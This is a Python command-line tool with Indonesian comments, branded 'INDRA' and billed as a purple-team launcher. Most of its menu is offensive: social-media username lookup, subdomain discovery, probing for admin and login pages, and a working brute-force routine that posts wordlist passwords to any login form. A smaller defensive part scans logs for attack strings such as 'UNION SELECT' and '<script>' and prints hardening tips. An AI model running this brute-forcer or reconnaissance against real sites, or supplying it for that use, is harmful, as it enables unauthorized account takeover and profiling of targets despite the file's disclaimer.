import os
import sys
import time
import socket
import requests # Pastikan install ini dulu: pip install requests

# --- KONFIGURASI WARNA (Biar Mata Gak Sakit) ---
RED = '\033[91m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# --- BANNER & UTILS ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear_screen()
    print(RED + "=" * 60 + RESET)
    print(CYAN + """
      I N D R A
    """ + RESET)
    print(RED + "=" * 60 + RESET)
    print(GREEN + "Legal of Siber Operation Center Analyst (SOC)" + RESET)
    print("Purple Team Launcher - Full Integrated Ops")
    print(YELLOW + "Disclaimer: Tools ini buat audit legal. Jangan dipake ngawur." + RESET)
    print("-" * 60)

# --- FUNGSI RED TEAM (SERANGAN/RECON) ---

def cek_username_sosmed():
    print(BLUE + "\n[1] OSINT: PENGINTAIAN USERNAME" + RESET)
    username = input("Masukin username target yang mau dicari: ")
    
    # List website umum buat dicek
    sites = [
        f"https://www.instagram.com/{username}",
        f"https://www.facebook.com/{username}",
        f"https://twitter.com/{username}",
        f"https://github.com/{username}",
        f"https://www.tiktok.com/@{username}"
    ]
    
    print(f"\nSedang melacak keberadaan '{username}' di dunia maya...")
    found_count = 0
    
    for url in sites:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                print(GREEN + f"[KETEMU] {url}" + RESET)
                found_count += 1
            else:
                print(RED + f"[ZONK] {url} (Status: {r.status_code})" + RESET)
        except:
            print(RED + f"[ERROR] Gak bisa konek ke {url}" + RESET)
            
    print(f"\nSelesai. Ditemukan {found_count} akun.")
    input("Tekan Enter buat lanjut...")

def cari_subdomain():
    print(BLUE + "\n[2] RECON: SUBDOMAIN FINDER" + RESET)
    domain = input("Masukin domain utama (contoh: google.com): ").replace("https://", "").replace("http://", "")
    
    # Wordlist subdomain standar (bisa lu tambah sendiri)
    subs = ["www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "web", "test", "dev", "admin", "api", "vpn", "blog", "shop"]
    
    print(f"\nNyari subdomain aktif di {domain}...")
    
    for sub in subs:
        url = f"{sub}.{domain}"
        try:
            # Kita coba resolve IP-nya
            ip = socket.gethostbyname(url)
            print(GREEN + f"[HIDUP] {url} -> IP: {ip}" + RESET)
        except:
            # Kalau error berarti domainnya gak ada atau gak resolve
            pass
            
    print("\nScanning subdomain kelar bro.")
    input("Tekan Enter buat lanjut...")

def cari_halaman_login():
    print(BLUE + "\n[3] RECON: CARI HALAMAN LOGIN/ADMIN" + RESET)
    target = input("Masukin URL Target (pake http/https): ")
    if not target.endswith("/"):
        target += "/"
        
    # List halaman login sejuta umat
    paths = [
        "admin/", "login/", "wp-login.php", "admin.php", "cpanel/", 
        "user/login", "administrator/", "login.php", "masuk/"
    ]
    
    print("\nLagi ngintip pintu masuk...")
    
    for path in paths:
        full_url = target + path
        try:
            r = requests.get(full_url, timeout=3)
            if r.status_code == 200:
                print(GREEN + f"[BISA DIAKSES] {full_url}" + RESET)
            elif r.status_code == 403:
                print(YELLOW + f"[DILARANG/403] {full_url} (Ada WAF mungkin)" + RESET)
            else:
                print(RED + f"[GAK ADA] {full_url}" + RESET)
        except:
            print(f"Skip {full_url}, koneksi timeout.")
            
    print("\nPencarian pintu login selesai.")
    input("Tekan Enter buat lanjut...")

def brute_force_login():
    print(RED + "\n[4] ATTACK: BRUTE FORCE LOGIN (SIMULASI POST)" + RESET)
    print("Pastikan lu punya izin tertulis buat ngelakuin ini!")
    
    url = input("URL Login (contoh: http://target.com/login.php): ")
    target_user = input("Target Username: ")
    wordlist_path = input("Nama file password (contoh: PASSWORD.txt): ")
    
    # Input nama form field di HTML target (harus inspect element dulu aslinya)
    # Default biasanya 'username' dan 'password'
    user_field = input("Nama field user di HTML (default 'username'): ") or "username"
    pass_field = input("Nama field pass di HTML (default 'password'): ") or "password"
    
    try:
        with open(wordlist_path, 'r') as file:
            passwords = file.readlines()
            print(f"\nMemuat {len(passwords)} password. Gas mulai serangan...")
            
            for password in passwords:
                password = password.strip()
                
                # Payload data yang dikirim
                data_post = {
                    user_field: target_user,
                    pass_field: password,
                    "submit": "Login" # Kadang butuh ini
                }
                
                # Kirim request POST
                try:
                    response = requests.post(url, data=data_post)
                    
                    # Logic sederhana: kalau panjang respon beda atau gak ada error, mungkin masuk
                    # Ini basic banget, biasanya kita cari keyword "Welcome" atau "Dashboard"
                    # Di sini kita print aja statusnya
                    print(f"Mencoba: {password} | Status: {response.status_code} | Size: {len(response.text)}")
                    
                    if "incorrect" not in response.text.lower() and "gagal" not in response.text.lower() and response.status_code == 200:
                        print(GREEN + f"\n[!!!] KEMUNGKINAN TEMBUS: {password}" + RESET)
                        print("Cek manual buat validasi.")
                        break # Berhenti kalau udah nemu
                        
                except Exception as e:
                    print(f"Error koneksi: {e}")
                    
    except FileNotFoundError:
        print(RED + "File password gak ketemu bro! Cek lagi namanya." + RESET)
        
    input("\nBrute force selesai. Tekan Enter...")

# --- FUNGSI BLUE TEAM (DEFENSE/ANALISA) ---

def analisa_log_bukti():
    print(CYAN + "\n[5] BLUE TEAM: ANALISA BUKTI LOG" + RESET)
    print("Fitur ini buat baca file log server (Apache/Nginx/Auth).")
    path = input("Lokasi file log (misal: access.log): ")
    
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            print(f"Membaca {len(lines)} baris log...")
            
            suspect_ips = []
            keyword_serangan = ["UNION SELECT", "eval(", "base64", "<script>", "1=1"]
            
            for line in lines:
                for key in keyword_serangan:
                    if key in line:
                        print(RED + f"[SUSPECT] Ada payload '{key}' di baris: {line[:50]}..." + RESET)
                        
            print("\nAnalisa cepat selesai.")
    except FileNotFoundError:
        print("File log gak ada bro.")
    input("Tekan Enter...")

def mitigasi_tips():
    print(GREEN + "\n[6] BLUE TEAM: TIPS MITIGASI & HARDENING" + RESET)
    print("""
    CARA MENYIKAPI PERETASAN AGAR TIDAK TERULANG:
    
    1. Ganti Semua Kredensial:
       - Password admin, database, FTP, SSH wajib ganti.
       
    2. Patching Celah:
       - Kalau kena SQL Injection -> Pake Prepared Statements.
       - Kalau kena Brute Force -> Pasang Rate Limiting atau Fail2Ban.
       - Kalau kena File Upload -> Batasi ekstensi file (blok .php, .exe).
       
    3. Isolasi & Backup:
       - Pisahin jaringan server yang kena hack.
       - Selalu punya backup data offline (Cold Storage).
       
    4. Monitoring (SOC):
       - Pasang SIEM (Wazuh/Splunk) buat alert realtime.
       - Jangan cuma pasif nunggu jebol.
    """)
    input("Tekan Enter buat balik...")

# --- MAIN MENU ---

def menu():
    banner()
    print("PILIH OPERASI:")
    print("[1] Cari Username (OSINT)")
    print("[2] Cari Subdomain Target")
    print("[3] Cari Halaman Login/Admin")
    print("[4] Serangan Brute Force (Pake Password List)")
    print("-" * 30)
    print("[5] Analisa Bukti Log (Blue Team)")
    print("[6] Tips Mitigasi & Pencegahan (Blue Team)")
    print("[0] Keluar")
    
    pilihan = input(f"\n{YELLOW}INDRA@SOC:~# {RESET}")
    return pilihan

if __name__ == "__main__":
    while True:
        pilih = menu()
        if pilih == '1':
            cek_username_sosmed()
        elif pilih == '2':
            cari_subdomain()
        elif pilih == '3':
            cari_halaman_login()
        elif pilih == '4':
            brute_force_login()
        elif pilih == '5':
            analisa_log_bukti()
        elif pilih == '6':
            mitigasi_tips()
        elif pilih == '0':
            print("Copy that. Operasi dihentikan.")
            break
        else:
            print("Perintah tidak dikenal.")
            time.sleep(1)
